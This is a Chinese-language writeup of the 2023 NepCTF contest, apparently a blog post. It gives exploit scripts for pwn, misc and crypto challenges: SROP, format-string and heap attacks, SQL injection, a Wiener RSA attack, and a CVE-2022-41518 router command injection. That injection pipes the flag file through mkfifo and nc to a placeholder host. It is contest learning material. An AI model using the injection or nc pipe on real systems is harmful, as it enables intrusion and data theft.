{"title":"[2023NepCTF] Csome Writeup","date":"2023-08-15T08:11:37.000Z","toc":true,"source":"_posts/2023NepCTF.md","raw":"---\ntitle: \"[2023NepCTF] Csome Writeup\"\ncomments: true\ntoc: true\ndate: 2023-08-15 16:11:37\ntags:\n  - CTF\n  - Pwn\n  - NepCTF\n---\n\n# 前言\n\n纪念一下，打的很爽Pwn抢了4道一血，可惜最后3分钟第一被超了\n\n![image-20230815163205113](2023NepCTF/image-20230815163205113.png)\n\n# Pwn\n\n## srop\n\nSrop一把梭，这里要注意，跳转是PLT表的syscall函数和真实的系统调用不一样，在函数内会将rdi赋值给rax，后面的参数寄存器都要后移一位\n\n```python\nfrom pwn import *\n\ncontext.arch = \"amd64\"\ncontext.log_level = 'debug'\n# io = process(\"./pwn\")\nio = remote(\"nepctf.1cepeak.cn\", 31943)\n\nmov_eax_15 = 0x0000400754\nbuf = 0x00000601050\nret = 0x004007AE\nsyscall = 0x0004005B0\npop_rdi = 0x0000000000400813\nstack = 0x0601a50\n\nframe = SigreturnFrame()\nframe.rdi = 0\nframe.rsi = 0\nframe.rdx = stack-0x8\nframe.rcx = 0x1000\nframe.rip = syscall\nframe.rsp = stack\n\npayload = b\"a\" * (0x0030+8) + flat([\n    pop_rdi,\n    15,\n    syscall\n]) + bytes(frame)\n\n\nio.send(payload)\nsleep(0.5)\n\nframe = SigreturnFrame()\nframe.rdi = 2\nframe.rsi = stack-0x8\nframe.rdx = 0\nframe.rcx = 0x1000\nframe.rip = syscall\nframe.rsp = stack + 0x110\npayload = b\"./flag\\x00\\x00\" + flat([\n    pop_rdi,\n    15,\n    syscall \n]) + bytes(frame) \n\nframe = SigreturnFrame()\nframe.rdi = 0\nframe.rsi = 3\nframe.rdx = stack-0x100\nframe.rcx = 0x40\nframe.rip = syscall\nframe.rsp = stack + 0x110 + 0x110\npayload += flat([\n    pop_rdi,\n    15,\n    syscall \n]) + bytes(frame) \n\nframe = SigreturnFrame()\nframe.rdi = 1\nframe.rsi = 1\nframe.rdx = stack-0x100\nframe.rcx = 0x40\nframe.rip = syscall\nframe.rsp = stack + 0x110 + 0x110 + 0x110\npayload += flat([\n    pop_rdi,\n    15,\n    syscall \n]) + bytes(frame) \n\nlog.success(f\"length {len(payload):#x}\")\nio.send(payload)\n\nio.interactive()\n```\n\n## HRPVM2.0\n\n核心思想是替换文件，这里重写了kernel文件，之后python再次调用程序就可以执行了shell了\n\n![image-20230814091413997](2023NepCTF/image-20230814091413997.png)\n\n命令顺序如下，这里不能输入#，但是shell脚本使用Popen需要有shabang开头，但是shabang并不被sh执行，但输入又不能输入回车，所以这里可以采用env -S绕过\n\n```\nmkdir app/templates\ncd app/templates\necho #!/usr/bin/env -S python3 -c \"import os; os.system('cat flag')\">kernel\nmount kernel\n```\n\n![image-20230814091915281](2023NepCTF/image-20230814091915281.png)\n\n但是mount会需要权限校验，这里需要利用溢出漏洞，off by \"two\"，也就是爆破1/16，踩中一个权限偏移内不为0的有效的堆地址，就可以绕过权限校验\n\n\n\n![image-20230814091404375](2023NepCTF/image-20230814091404375.png)\n\nexp\n\n```python\nfrom pwn import *\nimport requests\nreq = requests.session()\n\nurl = \"http://nepctf.1cepeak.cn:30424\"\nreq.get(url)\n\ncontext.log_level = 'debug'\n# io = process(\"./kernel\")\nio = tube()\ndef io_recv_raw(*a):\n    r = req.get(url + \"/receive\")\n    print(r.json())\n    return r.json().get('output', \"\").encode(\"utf-8\")\ndef io_send_raw(x):\n    r = req.post(url + \"/send\", data={\"input\": x})\n    \nio.recv_raw = io_recv_raw\nio.send_raw = io_send_raw\n# tob = lambda x: x.encode(\"utf-8\")\n\ndef rm(file):\n    io.sendafter(b\"$\", b\"rm %b\" % (file,))\n\ndef cat(file):\n    io.sendafter(b\"$\", b\"cat %b\" % (file,))\n\ndef init(content):\n    io.sendafter(\"Make a wish to Nepnep\", content)\n\ndef echo(file, content):\n    io.sendafter(b\"$\", b\"echo %b>%b\" % (content, file))\n\ndef mkdir(name):\n    io.sendafter(b\"$\", b\"mkdir %b\" % (name,))\n\ndef cd(name):\n    io.sendafter(b\"$\", b\"cd %b\" % (name,))\n\ndef exec(name):\n    io.sendafter(b\"$\", b\"exec %b\" % (name,))\n\ndef id():\n    io.sendafter(b\"$\", b\"id\")\n\ndef mount(name):\n    io.sendafter(b\"$\", b\"mount %b\" % (name,))\n\ndef leave():\n    io.sendafter(b\"$\", b\"exit\")\n\nfor i in range(32, 127):\n    log.success(f\">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>{i}<<<<<<<<<<<<<<<<<<<<<<<<<\")\n    leave()\n    req.get(url)\n    sleep(0.5)\n    payload = b\"\"\n    init(payload + b\";\" * (104 - len(payload)))\n    mkdir(b\"app/templates\")\n    cd(b\"app/templates\")\n    echo(b\"kernel\", b\"\"\"#!/usr/bin/env -S python3 -c \"import os; os.system('cat flag')\" \"\"\")\n\n    echo(b\"data\", b\"a\"*(0x100-2) + b\"bc\" + b\"\\x21\\x42\")\n    cat(b\"kernel\")\n    echo(b\"step1\", b\"mov rdi,data; syscall 0;\")\n    echo(b\"step2\", b\"mov rdi,data; mov rdx,258; syscall 1;\")\n    exec(b\"step1\")\n    exec(b\"step2\")\n\n    mount(b\"kernel\")\n#  59  52 65 0f 37  56 \n# 7c  12 3c 44 45  56\nio.interactive()\n```\n\n## Nep router\n\nhttps://gitee.com/baozhazhizi/IoT-vulhub/tree/master/Totolink/CVE-2022-41518\n\nCVE-2022-41518一把梭，这里用反弹shell得到flag\n\n```python\nimport contextlib\nimport requests\nimport os\n\nsession = requests.Session()\nlogin_url = \"http://106.75.63.100:34903/formLoginAuth.htm?authCode=1&userName=admin&goURL=home.html&action=login\"\nraw = session.get(login_url, timeout=5)\n\ninject_url = \"http://106.75.63.100:34903/cgi-bin/cstecgi.cgi\"\ninject_data = {\n    \"proto\":\"8\",\n    \"hostname\":\"';\" + \"\"\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/cat /flag/flag  |nc xxx.xxx.xxx.xxx 1234 >/tmp/f\"\"\" + \";'\",\n    \"topicurl\":\"setOpModeCfg\"\n}\n\nwith contextlib.suppress(Exception):\n    resp = session.post(inject_url, json = inject_data, timeout=1)\nprint(\"shell!? ---------------> \")\n```\n\n## login\n\n首先是路径穿越，由于不会校验目录，可以直接访问文件，下载文件，最后可以下载得到login ELF文件以及libc库，之后逆向很快能看到sprintf格式化字符串漏洞，最难就是本地调试找堆指针\n\nexp\n\n```python\nimport struct\nimport time\n\nimport requests\nfrom pwn import *\nimport logging\n\n\ndef creat_logger(log_path, logging_name, suf_name):\n    if not os.path.exists(log_path):\n        os.makedirs(log_path)\n    log_full_path = log_path + logging_name + suf_name\n    logger = logging.getLogger(logging_name)\n    logger.setLevel(level=logging.DEBUG)\n    handler = logging.FileHandler(log_full_path, encoding='UTF-8', mode='w')\n    handler.setLevel(logging.INFO)\n    formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')\n    handler.setFormatter(formatter)\n    console = logging.StreamHandler()\n    console.setLevel(logging.DEBUG)\n    logger.addHandler(handler)\n    logger.addHandler(console)\n    return logger\n\n\nlogger = creat_logger(\"./\", \"log\", \".txt\")\nreq = requests.session()\nstart = b\"deadbeaf\"\nend = b\"asdewedv\"\nurl = \"http://106.75.63.100:34617\"\n# url = \"http://172.20.192.1:8080\"\n\n\ndef read_s(offset):\n    if offset < 0:\n        offset += 2 ** 32\n    while True:\n        try:\n            r = req.get(url + \"/login\", params={\n                \"user\": f\"{start.decode()}%{offset}$s{end.decode()}\",\n                \"password\": \"aaaa\"\n            }, timeout=1)\n            break\n        except ConnectionResetError as e:\n            print(\"retrying...\", e)\n            time.sleep(0.5)\n            pass\n        except TimeoutError as e:\n            print(\"retrying...\", e)\n            time.sleep(0.5)\n            pass\n        except requests.exceptions.ConnectTimeout as e:\n            print(\"retrying...\", e)\n            time.sleep(0.5)\n            pass\n    s = r.content\n    # print(s)\n    code = s[s.find(start) + len(start):s.find(end)]\n    return code, hex(struct.unpack(\"<Q\", code[:8].ljust(8, b\"\\00\"))[0])\n\n\ndef get_p(offset):\n    if offset < 0:\n        offset += 2 ** 32\n    while True:\n        try:\n            r = req.get(url + \"/login\", params={\n                \"user\": f\"{start.decode()}%{offset}$p{end.decode()}\",\n                \"password\": \"aaaa\"\n            }, timeout=1)\n            break\n        except ConnectionResetError as e:\n            print(\"retrying...\", e)\n            time.sleep(0.5)\n            pass\n        except TimeoutError as e:\n            print(\"retrying...\", e)\n            time.sleep(0.5)\n            pass\n        except requests.exceptions.ConnectTimeout as e:\n            print(\"retrying...\", e)\n            time.sleep(0.5)\n            pass\n    s = r.content\n    code = s[s.find(start) + len(start):s.find(end)]\n    return code\n\n\ndef write(offset, x):\n    if offset < 0:\n        offset += 2 ** 32\n    while True:\n        try:\n            r = req.get(url + \"/login\", params={\n                \"user\": f\"%1000${x}c%{offset}$hhn\",\n                \"password\": \"aaaa\"\n            }, timeout=1)\n            break\n        except ConnectionResetError as e:\n            print(\"retrying...\", e)\n            time.sleep(0.5)\n            pass\n        except TimeoutError as e:\n            print(\"retrying...\", e)\n            time.sleep(0.5)\n            pass\n        except requests.exceptions.ConnectTimeout as e:\n            print(\"retrying...\", e)\n            time.sleep(0.5)\n            pass\n\n\n# p = 15196\n# write(p, 0x58)\n# print(f\"[+] {get_p(p)} => {read_s(p)}\")\n# p2 = 15513\ndef write_s(sx):\n    s = struct.pack(\"<Q\", sx).strip(b\"\\x00\")\n    print(s)\n    for i in range(len(s)):\n        p = 15196\n        write(p, 0x78 + i)\n        # print(f\"[+] {get_p(p)} => {read_s(p)}\")\n        p2 = 15511\n        write(p2, s[i])\n        # print(f\"[+] {get_p(p2)} => {read_s(p2)}\")\n        p3 = 15518\n        print(f\"[+] {get_p(p3)}\")\n\n\n# print(f\"[+] {get_p(15712)}\")\n# # xt = int(get_p(15712).decode(), 16)\n# # print(f\"[+] {xt:#x}\")\n# print(f\"[+] {get_p(15512)}\")\n# print(f\"[+] {get_p(16110)}\")\n# # print(f\"[+] {get_p(15712)} => {read_s(15712)}\")\n# for i in range(1, 0x31, 8):\n# x = xt + i\n# print(f\"[+] {x:#x}\")\nheap_base = int(get_p(15059).decode(), 16)\nprint(f\"[->] {heap_base:#x}\")\nxt = heap_base- 0x40\nprint(f\"[->] {xt:#x}\")\nwrite_s(xt)\nprint(f\"[+] done\")\nprint(read_s(15518))\n\n# write_s(0xdeadbeafdeadbeaf)\n# p = 15196\n# print(f\"[+] {get_p(p)} => {read_s(p)}\")\n# p = 15513\n# print(f\"[+] {get_p(p)} => {read_s(p)}\")\n# p = 15516\n# print(f\"[+] {get_p(p)}\")\n# for i in range(0x3d5b-10, 0x3d5b+100):\n#     code = get_p(i)\n#     if code.startswith(b\"0x55\") or code.startswith(b\"0x7f\") and len(code):\n#         content = read_s(i)\n#         # print(f\"[+] {i} => {code} => {content}\")\n#         logger.warning(f\"[+] {i} => {code} => {content}\")\n#         continue\n#     # print(f\"[+] {i} => {code}\")\n#     logger.info(f\"[+] {i} => {code}\")\n\n```\n\n## HRP-CHAT\n\n这一套题都是源码审计的题目，漏洞也很简单\n\n### 1\n\nSQL注入，注意这里不能用万能密码1' or 1=1--因为在client中scanf不支持空格，所以就要先在数据库中注册一个用户名为1的用户，然后再次注册一个用户名为`1'--`\n\n![image-20230814094413198](2023NepCTF/image-20230814094413198.png)\n\n### 2\n\n首先分析源码（其实也不用chat的sever，只要看client的处理逻辑即可）可以看到这里Bot模式只会返回一个字符串`'远程AI协助服务正在开发中!'`，但是我们需要服务器返回`RemoteVIPApplicationCertificationHasPassed`这一串才能获得flag，那么我们就需要伪造服务器返回的message。我们可以看Chat模式下的服务器的原理，服务器就是转发消息进行广播。那么我们就可以想到\n\n![image-20230814094950217](2023NepCTF/image-20230814094950217.png)\n\n如果让一台机器在Bot模式下，另一台机器在Chat模式下\n\n![image-20230814095426656](2023NepCTF/image-20230814095426656.png)\n\n那么我们就可以利用广播的机制，伪造服务器返回message，这里也没有做任何校验，所以就能得到flag\n\n![b9d03732b675ba6d6a492b90d01f9db](2023NepCTF/b9d03732b675ba6d6a492b90d01f9db.png)\n\n### 3\n\n3号题目我看不太出来有啥漏洞，感觉就是正常的逻辑，抽卡获取角色，用message查看当前角色池子和技能，抽到H3h3QAQ就可以了，释放第二个技能log4j，就能打死ThTsOd了\n\n![6a5cba2c75f12515107d0ae7af099ac](2023NepCTF/6a5cba2c75f12515107d0ae7af099ac.png)\n\n### 4\n\n这个比较玄学，在我打2号flag的时候，可能是2号flag需要卡一个时机，我就写了脚本爆破，可能请求太多了，服务器就崩溃了，进入Safe box的cmd界面，输入Safe_Mode_Key就可以获得flag\n\n# Misc\n\n## codes\n\npwn的思路打，先泄露libc，找到偏移直接system(\"env\")一把梭\n\n```C\n#include <string.h>\nint main(){\nprintf(\"1234\");\n  size_t tmp = &printf;\ntmp -= 0x61c90;\ntmp += 0x52290;\n((int (*)(const char *, ...))tmp)(\"en\" \"v\");\n } \n```\n\n## 与AI共舞的哈夫曼\n\n确实不用自己写代码，GPT一把梭\n\n```python\ndef decompress(input_file, output_file):\n    with open(input_file, 'rb') as f:\n        # Read frequency information\n        num_freq = ord(f.read(1))\n        frequencies = {}\n        for _ in range(num_freq):\n            byte, freq = f.read(1)[0], 0\n            for _ in range(4):\n                freq = (freq << 8) | f.read(1)[0]\n            frequencies[byte] = freq\n\n        # Rebuild Huffman tree\n        root = build_huffman_tree(frequencies)\n\n        # Decode compressed data\n        with open(output_file, 'wb') as out_f:\n            node = root\n            while True:\n                bit = f.read(1)\n                if not bit:\n                    break\n                bit = int.from_bytes(bit, byteorder='big')\n                for i in range(7, -1, -1):\n                    if (bit >> i) & 1:\n                        node = node.right\n                    else:\n                        node = node.left\n                    if node.char is not None:\n                        out_f.write(bytes([node.char]))\n                        node = root\n```\n\n## ConnectedFive\n\n万宁五子棋，注意下棋到同一个位置会死机所以要，写逻辑爆破，为了提高胜率，这里采用最朴素的策略，计算每一个空白位置自己的棋子的密度，来判断哪些位置更优\n\nexp\n\n```python\nimport random\n\nfrom pwn import *\n\ncontext.log_level = 'debug'\ncontext.timeout = 3\ngetIO = lambda: remote(\"nepctf.1cepeak.cn\", 30582)\nio = getIO()\n\ndef getinfo():\n    io.recvuntil(b\"MESSAGE computer: \")\n    io.recvuntil(b\"\\n\")\n    io.recvuntil(b\"\\n\")\n    io.recvuntil(b\"\\n\")\n    scoreboard = io.recvuntil(b\"\\n\", drop=True).decode()\n    # print(f\"[+] Scoreboard {scoreboard}\")\n\n    # io.recvuntil(b\"\\t   a b c d e f g h i j k l m n o\\n\")\n    checkerboard = []\n    raw = io.recvuntil(b\"\\t   a b c d e f g h i j k l m n o\\n\").decode()\n    for i in range(15):\n        # io.recvuntil(b\"\\t\" + bytearray([i+ord('a')]))\n        r = io.recvuntil(b\"\\n\").decode()\n        raw += r\n        a = r.strip()\n        checkerboard.append(a[3::2])\n    # print(checkerboard)\n    return scoreboard, checkerboard, raw\n\n\nkey = \"abcdefghijklmno\"\n\ndef check_pos(x, y, checkerboard: []):\n    res = 0\n    cnt = 0\n    for i in range(max(0, x-4), min(14, x+4)+1):\n        cnt += checkerboard[i][y] == 'X'\n    res = max(res, cnt)\n\n    cnt = 0\n    for i in range(max(0, y - 4), min(14, y + 4)+1):\n        cnt += checkerboard[x][i] == 'X'\n    res = max(res, cnt)\n\n    cnt = 0\n    for i in range(-4, 4+1):\n        if 0 <= x + i <= 14 and 0 <= y + i <= 14:\n            cnt += checkerboard[x+i][y+i] == 'X'\n    res = max(res, cnt)\n\n    cnt = 0\n    for i in range(-4, 4+1):\n        if 0 <= x - i <= 14 and 0 <= y + i <= 14:\n            cnt += checkerboard[x-i][y+i] == 'X'\n    res = max(res, cnt)\n\n    return res\n\ndef get_nice_pos(checkerboard):\n    p = []\n    for i in range(15):\n        for j in range(15):\n            if checkerboard[i][j] not in \".+\":\n                continue\n            p.append((check_pos(i, j, checkerboard), i, j))\n    p.sort(reverse=True)\n    return p[0][1:]\n\n\n\ndef action(checkerboard: []):\n    print(len(checkerboard), end=\" \")\n    for x in checkerboard:\n        print(len(x), end=\" \")\n    print()\n    while True:\n        # x = random.randint(0, 14)\n        # y = random.randint(0, 14)\n        # print(x, y)\n        x, y = get_nice_pos(checkerboard)\n        if checkerboard[x][y] in ['.', '+']:\n            return key[y] + key[x]\n\n\nfor i in range(100):\n    try:\n        s, c, r = getinfo()\n        log.success(f\"Scoreboard {s}\")\n        log.success(f\"Checkerboard \\n{r}\")\n        ans = action(c)\n        io.sendline(ans.encode())\n    except EOFError:\n        io.close()\n        io = getIO()\n\nio.interactive()\n\n```\n\n## CheckIn\n\nb站发不出去，等了一会儿，flag直接在题目描述了\n\n![image-20230814100358316](2023NepCTF/image-20230814100358316.png)\n\n## 陌生的语言\n\n![7612dfe97ed54dfe36942465eba34b7](2023NepCTF/7612dfe97ed54dfe36942465eba34b7.jpg)\n\nhttps://ay.medyotan.ga/upload/lwa_moonrunes.png\n\n![image-20230814104059226](2023NepCTF/image-20230814104059226.png)\n\n直接出\n\nNEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC\n\n## 小叮弹钢琴\n\n莫斯编码得到`YOUSHOULDUSETHISTOXORSOMETHING`，字面意思，你需要用这个xor，还有一段直接mid看\n\n![image-20230814101009564](2023NepCTF/image-20230814101009564.png)\n\n```python\nx = 0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17\nxx = x.to_bytes(x.bit_length() // 8 + 1, \"big\")\nkey = b\"YOUSHOULDUSETHISTOXORSOMETHING\"\nprint(xx)\nprint(len(key), len(xx))\nprint((bytearray(map(lambda x: x[0] ^ x[1] ^ 32, zip(xx, key)))))\n```\n\n大小写转换异或32\n\n## 你也喜欢三月七么\n\n首先是用群名字sha256得到`dd8e671df3882c5be6423cd030bd7cb69671ef27dfe7a541903edc4e23168009`取前面的16个字节\n\n![image-20230814101534500](2023NepCTF/image-20230814101534500.png)\n\n得到https://img1.imgtp.com/2023/07/24/yOkXWSJT.png\n\n![image-20230814101546437](2023NepCTF/image-20230814101546437.png)\n\n一眼星穹铁道的文字\n\n![efa6d5119c9f4eef31c7cdfea8d5312](2023NepCTF/efa6d5119c9f4eef31c7cdfea8d5312.png)\n\n翻译可得\n\nHRP_aIways_likes_March_7th这里的aIways的I是大写的i\n\n## lic\n\n磁带信息，先用audiotap转磁带文件，再用010打开\n\n![image-20230814101909845](2023NepCTF/image-20230814101909845.png)\n\n可以看到文字的NepCTF形状，利用脚本反转之后可以看到\n\n```python\nwith open(\"attachment.tap\", \"rb\") as f:\n    data = f.read()[50:].strip(b\"\\xa0\")\ndata = b\"aaa\" + data\nchunk = 16\nfor i in range(0, len(data), chunk):\n    # print()\n    x = data[i:i+chunk][::-1].decode(errors=\"ignore\")\n    print(\"\".join(map(lambda _: \"  \" if _ == '>' else _ + ' ', x)))\n```\n\n# Crypto\n\n## random_RSA\n\nwinner's攻击，这里用了低指数解密算法的脚本https://github.com/pablocelayes/rsa-wiener-attack，恢复d\n\n因为phi(n^2)近似(q^2-1)(p^2-1)，先用命令交互出一组数据，之后使用下面脚本爆破\n\n得到d之后\n\n因为$ed-1=k(p^2-1)(q^2-1)=k(p^2q^2-p^2-q^2+1)=k(n^2-p^2-q^2+1)$\n\n所以可以利用$(ed-1+n^2)/n$得到k\n\n之后一把梭求p，q即可\n\n```python\nimport ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator\nfrom gmpy2 import gcd, iroot\n\ndef hack_RSA(e, n):\n    '''\n    Finds d knowing (e,n)\n    applying the Wiener continued fraction attack\n    '''\n    frac = ContinuedFractions.rational_to_contfrac(e, n)\n    convergents = ContinuedFractions.convergents_from_contfrac(frac)\n\n    for (k, d) in convergents:\n\n        # check if d is actually the key\n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            # check if the equation x^2 - s*x + n = 0\n            # has integer roots\n            discr = s * s - 4 * n\n            if (discr >= 0):\n                t = Arithmetic.is_perfect_square(discr)\n                if t != -1 and (s + t) % 2 == 0:\n                    print(\"Hacked!\")\n                    return d\n\n\ndef attack(n, e):\n    d = hack_RSA(e, n * n)\n    k = (e * d - 1 + n * n) // (n * n)\n    tmp = (n * n) - ((e * d - 1) // k) + 1 + 2 * n\n    ppq = int(iroot(tmp, 2)[0])\n    tmp = (n * n) - ((e * d - 1) // k) + 1 - 2 * n\n    pmq = int(iroot(tmp, 2)[0])\n    p = int(gcd(ppq + pmq, n))\n    q = n // p\n    assert p * q == n\n    assert e*d % ((p-1) * (q-1)) == 1\n    return p, q, d\n\n\nss = \"\"\"\n9664150901450480967690564598017074925278657678428083526647019231493500227501186171121223353625264405549895808023865076405682104148869646937802710197692149880801739296224423720449697986562014962810427149274953670336431969720847239367252577312181797620406921597928891203908280967606801144879943997948288687269135451721341591758893489869339520600383114702594831680556978281938914417626897063741811649257614797234325708166759403120480173752153249168733044607204951768557734895758143808863754965572034240739588491294098941537522398891830128387438317592253663045532862058982832135946842401711673333170801808131328328138409\n22983334574580917801180860838975915911056113991786778412831201182411314364399816331219602816987801515703576764159087708450625423803558017646160341422267439951044407124414015864769966876129437519084492109510818093789724685834745254039500061544494687297354628168281982577957457924120597256869151402144742486005161738151255767127578010682514603747674732192539709537275806788688798050708598638377916842971631011263261195175705071683872373603843884113967910301479453532836470974019712063094982740534667039293541440015250164631599817949388195744930270131276498157477215483242544464596689268807389029069272532067490083369547669715239977992410158704220313287358936476570197236442784273557421888378497464433353892887766426339418782876390919046890278793088868131975197880580905027785352428189007480894687391277338836087221071379217489414415183919425962364501612704379275059469144794211736312560265881110693864711202763941138206607689382712402597791806706502788925221170513306681258576676019323627743632448114452443097397014141839634039981951855535241851424638689366379545342739319677785567174640217613527540438283508170772807801142587539976048845517400474132948151081974542377578704999265763979523387588936804746887912462709543565738342209411\n26421545185254987799905424190746332339125127121314171591428976353667115363763727486775614091903284658438097216623238914712478521157241139537987344330841699472419239411492271130318030306609434654284036687937944162679104946235126178521045633190386482424340322162024092955319660759058652161996411895209248718547013152501979160191126988501306653660575206430331327547695958573346502447806907651886805983227927733506487689107733064048662109346548423844168211328529388196436068858018422470472568131170937800147226367812703244919615304030171460050297573510835520868630853149705239212069246257510861666696541821151818169796199\n647587495710510972114742400831708548154715412535242193260921609695347930936707036639358968164012520349909437957090794941485190580257732521977171932341037504324231632999867734166481147062308183081010136684146530539354916263125020063213571051436518584206830118093755508481812082245822690944819197599760354341006609736609770789666793064642703641481389320623277678173558301629672865116377269127942025612180794827944539599815847863105760862109828389140681525680276554276533927094628602058843675286071339454429465986971694907927688830239142611855187274379851523189108755859657533224271693320278278605425423386495384174568562497627761612422045791957059437741493328698509481368554006456683812993984891378698935039540883929464645807942966456158605263661813471703445078327854656000079848297587266423318192874967873522951070558487797128927313745909508734015212545363132719971877683921675395438436594169300084386617636244174085949981341272801441913192529055922603538974179887610571219493524648953191928761783132985310317276631200614903232826609021472846793881344295699985919781942936761500592413666531213913327520376681809371295266029776133655277736129022073066033964950152867511761886746401418419578828754174047939112010456150675463575657509189\n10802012890829459540541628896792295078778436077857489427389981093725666739897304883046269390863878441152550000748160396908161524179907858077000487740264046477305439871796448601143325277932003810352123707096051383675738121180861345577006541031517155258339948241289482502904363911440323113072882087374540321696726636204227138558487828152291517517119224906926633391353300941778394425937626996455545868331674490267329118395561623628314372766364381142098697604044336132503664081692651614933878766623288150407771680698950374395680226687162951709227319486379639675961227436372862323642542582705252736363789548988448924281523\n83164181286675647518830286473660936842056768837605965773754722828164869255002601931877175384944967168423206258868966986144360226269117391889938003716473472419177908278255032274351977454805821764218411534787094767284216135276174354406996436906142025032430967949150772284199385705263345050808935420677789360168112630311736817620156906081165474809562107538852267394278439066621108665747312736533966159229107173152465365414052064089548384023025856375904149686916115214912086305308341266693329116385815754412736749978601321323191864143850174315828039788320203726197797788026323483995092501876361540056171546433345056509023822723392649116651071369395319931930221212866085340561430347693225966408351502938942294604586300299982831155358938495260400185484497256896416324370391657125309375755376057180940858375964786733652546488880996426657064631708252560023474877949301792612429382653730100520713338044964401333750090947037843448152614531864695601400078878276612572266304350518364495335341275038759497131064447619421326513680343303115330200681996349441238490209605256140282866353360785265474868465131016931425931964393177163140173169398499291572984733338118081910704432753107524477347843354958141041369207588577081612844623302487399941453933\n7896711153350680182046433804310163873530744638818895739714243668607588547792890005637528789452971314751693622472528149754510450552025972279187841776097749142749323304216218612718765727398943401294644022496938258864873262044174164494124912426175372524656376121897875690251938452930789747994519674300862595216275541928658146402252536829579922303097776404657455395450853161185534506599329499328761065707811197966475148318482438088816924842458585192796056395380885795831624193355572079389648572361687920747403086875781493091238221420792111039898275872964722825166960441004965842026859265796562573640732063541877035703999\n2453336941794377920668315851654619953646928905461467141099094168657719206064766651951427088886039685796776114141822989089619723777926424614857001633051068225552956142083890497598873667557028446871021184458240143729566494812770661669240646268836255291274950055880283884837660674102748619167688728015214974199172102739298082411466099956770246119223362727103493898761907722553589378295675272645561934551025890703140999463094569248990423646872411723328409457823533926161366175638210485154684713670484074111551184519212764546709551586814178654768531770178427218348159524090067132668379834207556749709109588553767744958928030458642933207972731738889836640270310522407082557073074220327314630716521374036182110178874650024321686921170512401592772523798249960102467660742850794643617416339049505280450162445401270432730440216281390479357051798091526529334107226924555476475287445348397336720445992548926807772402601594999910439716972523884323110378738095230641354005535939595738498325951885080299526970515488294162554370726438356887387936240973624985584430961461016270437469408900537013699409622145224578929157293051142754994365105441300293953769949427089080402762107252481674439414260001163630002002209227608718701864539764471854120765149\n934357599818997062963713308304362991596280828009512110755774617078887165360994483469754259794232045134748049571365890970600399733065188159532911208357285158307632045436603686477662110964558434302467120269827088523605436776745307435600233303494688594128265424710248665574421617599397235608386293736009112635240116363197127688715563025691804376760043956191129689115106451454594303458289356459242344139405236999049625726629507017505219076937886664753583057499783039263793580691707653961619033353122066993401993412281067305045569711817510917816670267012976388544311131447428560310255424118434372129058504068971704509583\n452535985385426610533595291636837260029529161119012527028832154063118066054114365212225611604413376466306821291622206453481076548722964431496720642815073434660316751461773927736769380260565572635521865666418131804097223787559572584034429232767907408588386908627811135292858626656533240022150603513420578118687227948584091074426900135895322629439907454314781910440178440833975308243442451505929901732597325250942477885257392248372956797459556418043140426549205059992693832494817312609114820874540542115879517751481239945773745036685837555782445189562031306229705420041083026014508308653365829010341657395972738383225136782775802242507679530114388408690163501378818581259836086658314750295168292063413234606975054845567353768299988855117672810051088400466976103022087953981820980574159918396071750775318139479271235473733328684536087473478158695154228827351532739332906517313798270187902326156179644850383883874005798210565002897279183014905697229418005561458301283927876097634598729273370887688127716799146589959547718296529504218197024144569252951455907047844555593109642331128337551457131825334129476995668564725114284200611621984522440766436051246003019078387721989410126014046300337526406832227661211670511374666171933242207761\n21636726262954983891798049753528884949149278107055957653804164122232750629108771687361858365462276461758050089339414649308189481865701469685971089624677686415038790141344992019067961279901006021154460525723482009962909666812029094177916225260557575750852951983028595026985975759287231315896982867941386247369741207715929550901277459410981688464120324580668604126829385737148142010733680106833740158713528050751799693988082141485112234559239865511692418065113774817308071898684749289577274638116406277808547134140659187860357703459236546455683700089064295899984063024669612762793525503212165546539776762359198804880143\n121831222096537368999356089708412896046021123796479990498164844552933248218587707868671273702871780046383065460423688141024214392817157791234305056319786064285936708392236448824783787802429682770337272235088202671105152535710294695902974253047704609221448981405609532633533062373004757059178427305919782441807444728003944125735197038228206500793881947731683045961796477046714111614358449413877923492947221540637411996522154279667079850899812790025430709528400798251289702825878302828745393493824877531623611021252456356175891394204733580270256164603165280954431866062942260146653644302782243197898971847034949620717936360716813922698249012591248773536863924987646374098897933678199676635398286431303649466386258192966901198806753276444091301228010214339088108290023638595922653691209504127688631013840850339138278703745938757018854197798962009892613282181507128330931048662067002367216863617848322567299023690624245593206164105677495564960539642415302357595708814138558968835481632687790665010565719903412940128287504825368916534220790908431745824689253975485426199665419413293026825301727942248672409218671101407001619695622271079059718159320809385046289813332457898242478875287662049306326128127096487004090260965504341859573161979\n5970296459863639263155783075172703907538560676961520474432385024839627916414414908656192009767702560571700661568202705725697718102111106038786955170270219508803648130754658135536335026559679753140733217830203813331793926165711104662514382832955840370630723176415927796955765169553517462286240424922177248496576208476937262840173500549507825256850681559103373575719799534073745792805709350898345377043444572387322205792026096379146084848266043619559701164699491546970266459037417312873294970955821603622312389603295515738649074112877256884131342394799593566008925579319817453597162465762851343362551362340193519234111\n18976399709138358912615581289803736063685392526627126047585536571255137591890898469016131796862155245718632726865355864471577906314641282253655270136097246496157189183315479252842675388863506996293537386049856520375327248649829502157752917745660189131281987348802723603782945921331000190785525591621756168923822951821404353646825235167866284344617268886872941218738132870839917479807740404673373159559070563008075098345562213387428585134527952927397372161736924000067060148836364979179350873731455181407191524960955000331041112836325967730682314802564504793245212062165765383998948417925582958872582993455246869810367559513521188245827564742949660925007994864642588404989913088438650029238240908588039032304578884090105469536379896758734713314973495243747985470691862911913134723349279860545443973275726615548263752591810660223834517909123784767147753948727361870320431446223866316111276171603492135128216357176021812643706643763587976997347084988208779018873039456862231395447809853586521609100405013300467752808797446255256509955396709060833818059140619116092459497493686455825427088609805918612964163855925495410440760559642006382819680630706627333218589739634830096224810601690036163130895447446190737732854075739908518171940791\n\"\"\".strip().split()\narr = list(map(int, ss))\nxx = []\nfor x in range(7):\n    n = arr[2*x]\n    e = arr[2*x + 1]\n    xx.append(attack(n, e))\nprint(xx)\n#\nglobal_bits = 1024\n\nfrom extend_mt19937_predictor import ExtendMT19937Predictor\n\nfor p, q, d in xx:\n    print(hex(p & 0xffffffff), hex(q & 0xffffffff), hex(d & 